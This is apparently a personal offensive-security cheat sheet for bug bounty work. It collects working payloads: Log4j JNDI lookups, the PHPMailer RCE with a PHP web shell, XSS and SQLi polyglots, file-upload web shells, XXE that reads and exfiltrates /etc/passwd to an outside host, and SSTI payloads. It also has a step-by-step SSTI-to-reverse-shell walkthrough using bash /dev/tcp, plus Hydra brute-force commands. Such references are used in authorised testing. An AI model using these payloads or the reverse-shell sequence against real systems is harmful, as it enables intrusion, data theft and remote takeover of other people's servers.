# just a part of my private notes.

>This repository is maintained by myself 😎

<img alt="GIF" src="https://media1.tenor.com/images/0b33c5e2cdf8af7eed1fcb264639f9e0/tenor.gif?itemid=16242461" width="500" height="320" />

`<img src=x onerror=alert('I hope you will find something helpful here :)')>`

### Contents:
  - [Categories](#contents)
      - [Bug Bounty 👨🏽‍💻](#bugbounty)
      - [Linux 🐧](#linux)
      - [Windows 🪟](#windows)
      - [Linux privesc 🤖](#linux-privesc)
      - [Windows privesc 😃](#windows-privesc)
      - [Android 📱](#android)
      - [Extra notes 🗒](#extra-notes)



### BugBounty
  - [Payloads](#payloads)
  - [JSON](#json)
  - [RCE](#rce)
     - [PHPMailer](#phpmailer)
     - [Node.js](#nodejs)
  - [One liner bugbounty](#one-liner-bugbounty)
  - [CMS exploitation](#cms-exploitation)
     - [Wordpress](#wordpress)
  - [Basic enumeration](#basic-enumeration)
     - [find subdomains](#find-subdomains)
     - [brute force >](#brute-force)
     		- [hydra](#hydra)
      		- [ffuf](#ffuf)
  - [Polyglot payloads](#polyglot-payloads)
     - [XSS polyglot](#xss-polyglot)
     - [SQLi polyglot](#sqli-polyglot)
     - [JS/URL polyglot](#jsurl-polyglot)
  - [Cookie hacking](#cookie-hacking)  
  - [Bypass technics](#bypass-technics)
     - [Bypass file upload filtering](#bypass-file-upload-filtering)
     - [Bypass 401/403](#bypass-401403)
     - [Bypass 429](#bypass-429)
     - [Bypass password reset](#bypass-password-reset)
     - [Bypass LFI WAF](#bypass-lfi-waf) 
  - [Open redirect](#open-web-redirect)
  - [Cross Side Scripting (XSS)](#xss)
      - [Common payloads](#common-payloads)
      - [XSS to LFI](#xss-to-lfi)
      - [Top XSS dorks](#top-xss-dorks)
  - [XML External Entity (XXE)](#xxe-common-payloads)
      - [Exploitable Protocols](#exploitable-protocols)
  - [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
      - [SSTI CheatSheet](#ssti-cheatsheet)
  - [Sever Side Request Forgery (SSRF)](#ssrf-common-payloads)
  - [Client Side Request Forgerty (CSRF)](#csrf-common-payloads)
  - [Carriage Return and Line Feed (CRLF)](#crlf-common-payloads)
  - [Local File Inclusion (LFI)](#local-file-inclusion-lfi-payloads)
  - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
  - [Structured Query Language injection (SQLi)](#sql-injection-payload-list)
  - [Insecure deserialization](#insecure-deserialization)

### Linux
 - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
 - [cURL Cheat Sheet](#curl-cheat-sheet)
 - [ZIP all in one](#zip-all-in-one)
 - [Useful find commands](#useful-find-commands-example)
 - [Keyboard shortcuts for terminal](#keyboard-shortcuts)
 - [Simple bash port scanner](#simple-bash-port-scanner)
 - [Python virtual environment](#python-virtual-environment)
 - [Specific user file permission](#specific-permission-for-specific-user)
 - [SMB enumeration](#smb-enumeration)
 - [Redis](#redis)
### Windows
- [Basic enumeration](#basic-enumeration-on-linux-and-windows)
- [SMB enumeration](#windows-smb-enumeration)
- [MS SQL](#ms-sql)
- [xfreerdp](#xfreerdp)

### Linux Privesc
  - [LXC/LXD container](#lxclxd-privilege-escalation)
  - [Perl setuid capability](#perl-setuid-capability-privesc)

### Windows privesc
 - [metasploit](#metasploit)
    - [local_exploit_suggester](#local_exploit_suggester)
    - [mimikatz_kiwi](#mimikatz-kiwi)
 - [mimikatz](#mimikatz)
 - [impacket](#impacket)
    - [psexec](#psexec)
    - [smbexec](#smbexec)
    - [wmiexec](#wmiexec)
    - [dcomexec](#dcomexec)
    - [crackmapexec](#crackmapexec)
    - [smbclient](#smbclient)
  - [evil-winrm](#evil-winrm)

### Android
- [ADB Basics](#adb-basics)

### Extra notes
  - [make NTML hash from password](#make-ntml-hash-from-password)
  - [snap](#snap)
  - [SMTP](#smtp)
  - [SQLi+XSS+SSTI](#sqli-xss-ssti)
  - [ShellShock](#shellshock)
  - [grep](#grep)
    - [emails](#emails)
    - [urls](#urls)
  - [Password-List](#password-list) 
-------------------------------------------------------------------------------------------------------------
# Payloads
## Log4j

```http
${jndi:ldap://xxxxx.burpcollaborator.net/a}
```

### ":-" notation
```http
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
```

### Unicode Characters (JSON REST API request)
```http
${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}
```

### "::-" notation
```http
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
```


# JSON

##### `bypass admin login on sql misconfig`
```http
POST /api/login HTTP/1.1
Host: vuln-web.io
[...]

{"username":"admin","password":{"password": 1}}
```

# RCE
### PHPMailer
##### `CVE-2016-10033: PHPMailer RCE Exploitation`

The exploitation of this issue is done in two steps:
* Create a file with a PHP extension in the web root of the server.
* Access the newly created file.

To create the file, you can inject some extra-arguments to the command as part of the email address:
```http
"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1
```
This will allow us to create the file /var/www/shell.php. To get code execution, we also need to inject a web shell in the email's body:
```php
<?php system($_GET['x']);?>
```
Finally, you need to access your web shell to execute commands using the `x` parameter.


### Node.js
##### `node.js calculate() rce with json body`
```http
POST /api/activity HTTP/1.1
Host: vuln-web.io
[...]

{"activity":"sleep'+(global.process.mainModule.require('child_process').execSync('sleep 10'))+'","health":"63","weight":"42","happiness":"56"}

```

# One liner BugBounty

### XSS finder
```bash
waybackurls test.com | tee test.com-urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><svg/onload=confirm(1)>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<svg/onload=confirm(1)>" && echo -e "$host \e[31m Vulnerable\n" || echo -e "$host \e[32m Not Vulnerable\n";done 
```

# CMS exploitation

### Wordpress
------------------------------------
#### basic enumeration on `xmlrpc.php` file - (if enabled)

`list all methods`
```xml
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
`send a pingback request`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://hash.burpcollaborator.net</string></value>
</param><param><value><string>http://vulnerable-site.com</string>
</value></param></params>
</methodCall>
```
`username & password bruteforce`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```
-------------------------------------
# Basic Enumeration

### Find Subdomains

#### `wfuzz`

```
sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 <targetURL>
```

Now you may get a ton of output that shows valid subdomains depending on how the site is configured. If you notice a large amount of results that contain the same word count, this may just be an indication that the site returns a 200 response, but it just displays a “Not found” error.

`To remove results with a specific word count, you can append your command w/ --hw <value>. For example, our new command that removes results that respond a word count of 290 would look like the following:`

```
wfuzz -c -f sub-fighter -w top5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" --hw 290
```

### `sublist3r`
 
with sublist3r it is simple as
  
```
sublist3r -d <domian name>
```
 
 
### `gobuster`
  
`dns`
```
gobuster dns -d erev0s.com -w awesome_wordlist.txt -i
```
 `vhost`
```
gobuster vhost -u erev0s.com -w awesome_wordlist.txt -v
```

# DNS enumeration
```
amass -active -brute -o hosts.txt -d yahoo.com
```
----------------------------------------------------------------------------------------------------------------
# Brute Force

### Hydra

Hydra Password Cracking Cheetsheet

The following table uses the $ip variable which can be set with the following command:  

`export ip <target-ip>`


| Command | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
| `hydra -P password-file.txt -v $ip snmp`                                                                                                    | Hydra brute force against SNMP                       |
| `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`                                                                       | Hydra FTP known user and rockyou password list       |
| `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`                                                                              | Hydra SSH using list of users and passwords          |
| `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`                                                                         | Hydra SSH using a known password and a username list |
| `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`                                                                                         | Hydra SSH Against Known username on port 22          |
| `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`                                                                          | Hydra POP3 Brute Force                               |
| `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`                                                                                         | Hydra SMTP Brute Force                               |
| `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`                                                                                 | Hydra attack http get 401 login with a dictionary    |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`                                                           | Hydra attack Windows Remote Desktop with rockyou     |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`                                                             | Hydra brute force SMB user with rockyou:             |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-form-post "/login.php:username=^USER^&password=^PASS^:Invalid Username"` | Hydra brute force a Wordpress admin login            
| `hydra -L usernames.txt -P passwords.txt $ip smb -V -f` | SMB Brute Forcing |
| `hydra -L users.txt -P passwords.txt $ip ldap2 -V -f` | LDAP Brute Forcing |

-----------------------------------------------------------------------------------------------------------------
# Polyglot payloads

### XSS polyglot

```js
%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
```
```js
'">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>
```
```js
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)// 
```
```js
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

### SQLi polyglot
```
SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
```
```
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
```

### JS/URL polyglot
```js
data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
```


-----------------------------------------------------------------------------------------------------------------

# Cookie hacking

### JWT follow the following pattern:
```java
Base64(Header).Base64(Data).Base64(Signature)
```
### JWT secret bruteforce (crack)
#### `hashcat`
```bash
hashcat -a 0 -m 16500 <YOUR-JWT> /opt/web/wordlist/jwt-secrets.txt
```
#### `jwt-tool`
```bash
jwt-tool <YOUR-JWT> -C -d /opt/web/wordlist/jwt-secrets.txt
```
### Tamper jwt token content
```bash
jwt-tool <YOUR-JWT> -S hs256 -p "secret1" -T
```
-----------------------------------------------------------------------------------------------------------------
# Bypass technics
### Bypass File Upload Filtering

`.gif`file header
```php
GIF89a;

<?php
system($_GET['cmd']);
?>
```

`exiftool`

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg

mv evil.jpg evil.php.jpg
```

`magic header`
```bash
head -c 20 example.png > magic.php && echo "<?php system($_GET['cmd']);?>" >> magic.php
```

### Bypass 401/403

#### Try differnet verbs to access the file-> `GET`, `HEAD`, `POST`, `PUT`, `DELETE`, `CONNECT`, `OPTIONS`, `TRACE`, `PATCH`, `INVENTED`, `HACK`
```http
GET /api/getUser --> 403
GET / + X-Original-URL : /api/GetUser --> 200

GET /api/getUser --> 403
GET / + Referer : https://site.com/api/GetUser --> 200
or
GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
```
<img src="https://raw.githubusercontent.com/channyein1337/403-bypass/main/image/usage.png" width="500" height="320"/>
<img src="/img/401-403-bypass1.jpeg?raw=true" width="600" height="700"/>
<img src="/img/401-403-bypass-payload.jpeg?raw=true" width="600" height="700"/>

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

`curl -H "Content-Length:0" -X POST https://example.com`


### Bypass 429
#### Rate Limiting Bypass : `429 Too many Requests`

#### Append the headers to a request where the server is responding with `429`

```http
Client-Ip: [random-ip] -> 200
X-Client-Ip: [random-ip] -> 200
X-Forwarded-For: [random-ip] -> 200
X-Forwarded-For: 127.0.0.1 -> 200
```

### Bypass password reset
1. Include controlled mail as a second parameter
2. Bruteforce reset token
3. Try to use a reset token on another account
4. Try to figure out how token are generated


<img src="/img/password-reset.jpeg?raw=true" width="800" height="600"/>


### Bypass LFI WAF

If the WAF blocks you from reading /etc/passwd directly, you can use `?` to bypass it.
```bash
curl http://vulnerable-web.io/read.php?filename=/etc/passwd -i
HTTP/1.1 403 Forbidden
[...]
```
```bash
curl http://vulnerable-web.io/read.php?filename=/??c/?as?wd -i
HTTP/1.1 200 OK
[...]
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
```
-------------------------------------------------------------------------------------------------------------
# Open web redirect

### Open web redirect common payloads
```xml
/%09/example.com
/%2f%2fexample.com
/%2f%2f%2fbing.com%2f%3fwww.omise.co
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\;@example.com
///example.com
///example.com/
//google.com/%2f..
//www.whitelisteddomain.tld@google.com/%2f..
///google.com/%2f..
///www.whitelisteddomain.tld@google.com/%2f..
////google.com/%2f..
////www.whitelisteddomain.tld@google.com/%2f..
https://google.com/%2f..
https://www.whitelisteddomain.tld@google.com/%2f..
/https://google.com/%2f..
/https://www.whitelisteddomain.tld@google.com/%2f..
//www.google.com/%2f%2e%2e
//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
```
#### [source](https://github.com/payloadbox/open-redirect-payload-list)
-------------------------------------------------------------------------------------------------------------

# XSS
### Common payloads
```xml
<img src=x>
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>
```

### XSS to LFI

#### most common payloads
`<script>`
```js
<script>
    x=new XMLHttpRequest;
    x.onload=function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
```
`<iframe>`
```js
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```
`<script>` and `<iframe>` with `document.write`
```js
<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
```
### Top XSS dorks
```http
?q={payload}
?s={payload}
?search={payload}
?id={payload}
?lang={payload}
?keyword={payload}
?query={payload}
?page={payload}
?keywords={payload}
?year={payload}
?view={payload}
?email={payload}
?type={payload}
?name={payload}
?p={payload}
?month={payload}
?immagine={payload}
?list_type={payload}
?url={payload}
?terms={payload}
?catagortid={payload}
?key={payload}
?l={payload}
?begindate={payload}
?enddate={payload}
```
--------------------------------------------------------------------------------------------------------------
# XXE common payloads
### XXE: read local files
  `linux`
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

  `windows`
 ```xml
  <?xml version = "1.0"?>
  <!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///windows/win.ini"> ]>
<order>
  <quantity>1</quantity>
  <item>
&exploit;
</item>
  <address>USA</address>
  </order>
 ```
If the output of the `win.ini` file on the target returns the response message, then it proves that the XML External Entity vulnerability is present.

### use replace funtion if case sensitive
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&exploit;</lastName>
</userInfo>
```

### XXE - Out-of-band - payloads
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
```
##### Send the content of `/etc/passwd` to `www.akr3ch.com`, you may receive only the first line.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callme SYSTEM "www.akr3ch.com/?%xxe;">
]
>
<foo>&callme;</foo>
```

### XXE file read via XInclude payload as parameter value 
#### `payload`

```xml
<akrech xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></akrech>
```

#### `url encoded payload`
```
%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%0d%0a%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e
```
#### `Request demo`
```http
POST /product/stock HTTP/1.1
Host: web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
...
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%0d%0a%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e&storeId=1
```
#### `Response demo`

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1279

"Invalid product ID: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```


### XXE to RCE
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY exploit SYSTEM "expect://id"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&exploit;</lastName>
</userInfo>
```
### XXE to SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```
### XXE inside SVG
`RCE`
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://id"></image>
</svg>
```
`LFI`
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

#### [source](https://github.com/payloadbox/xxe-injection-payload-list)

### Exploitable Protocols

File: could be used to read local file on the server
	
	file:///etc/passwd

HTTP(s): useful in OOB Data Exfiltration
	
	http(s)://securityidiots.com/lol.xml

FTP: useful in OOB Data Exfiltration & hitting the internal FTP service which is behind NAT
	
	ftp://securityidiots.com/lol.xml

SFTP: hitting the internal SFTP service which is behind NAT
	
	sftp://securityidiots.com:11111/

TFTP: hitting the internal TFTP service which is behind NAT
	
	tftp://securityidiots.com:12346/lol.xml

DICT : could also be used to make requests to internal services
	
	dict://ip:22/_XXX
	
	dict://ip:6379/_XXX

NETDOC: This could be used as an alternative to file in JAVA based Servers.
	
	netdoc:/etc/passwd

LDAP: could be used to query internal LDAP Service.
	
	ldap://localhost:11211/%0astats%0aquit

GOPHER:
	
	gopher://<host>:<port>/_<gopher-path>

	gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)

Making internal HTTP Requests(GET,POST..etc):

	gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
	
	gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body

PHP: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.
	
	php://filter/convert.base64-encode/resource=index.php

Data:
	
	data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk
	
--------------------------------------------------------------------------------------------------------------
# Server Side Template Injection (SSTI)

## SSTI CheatSheet
### `Polyglot`
```python
${{<%[%'"}}%\
```

### `FreeMarker (Java)`
```java
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
```
### `Java`
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.html").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```
### `Golang`
```go
{{ . }}
{{.Email}}
{{.Password}}
{{ .system "id" }}
```
### `Twig (PHP)`
```php
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

### `Smarty (PHP)`
```
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```
### `Handlebars(NodeJS)`
```js
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```
### `Velocity`
```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
### `ERB (Ruby)`
```ruby
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```
### `Django Tricks (Python)`
```python
{% debug %}
{{settings.SECRET_KEY}}
```
### `Tornado (Python)`
```python
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
```
### `Mojolicious (Perl)`
```perl
<%= perl code %>
<% perl code %>
```
### `Flask/Jinja2: Identify`
```python
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
```
### `Flask/Jinja2` 
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open(“/etc/passwd”).read() }}
```
### `Jade`
```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
### `Razor (.Net)`
```
@(1+2)
@{// C# code}
```
### SSTI to reverse shell
#### [1] Try this, everywhere the app is taking input from the user and reflecting the output.

```python
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
{{config}}
```
#### [2] if the app reflects the output as `49`.Then there might be a RCE possible.
#### [3] now encode the payload in basse64.

`input`
```shell
echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
```
`output`
```
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
```
#### [4] now start a listener
```bash
nc -lvvp 4444
```

#### [5] resend the request with this command
```python
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
```

#### [6] if everything works currectly. You should get a reverse shell.
```bash
nc -vv -lnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.130.
Ncat: Connection from 10.10.11.130:54434.
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### [+] or we can try those above commands also, if the previous one doesn't works.
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
```python
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
```python
{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
```
```js
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
```
#### `bypass common WAF`
```
{%25+include+request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("sleep+5")|attr("read")()+%}
```
--------------------------------------------------------------------------------
# SSRF common payloads
```http
http://127.0.0.1:80
```
```http
http://127.0.0.1:443
```
```http
http://127.0.0.1:22
```
```http
http://0.0.0.0:80
```
```http
http://0.0.0.0:443
```
```http
http://0.0.0.0:22
```
--------------------------------------------------------------------------------

# CSRF common payloads

### On click submit - HTML GET
```html
<a href="http://www.example.com/api/setusername?username=CSRF">Click Me</a>
```
### Auto submit - HTML GET
```html
<img src="http://www.example.com/api/setusername?username=CSRF">
```
### On click submit - HTML POST

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRF" />
 <input type="submit" value="Submit Request" />
</form>
```
### Auto submit - HTML POST
```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
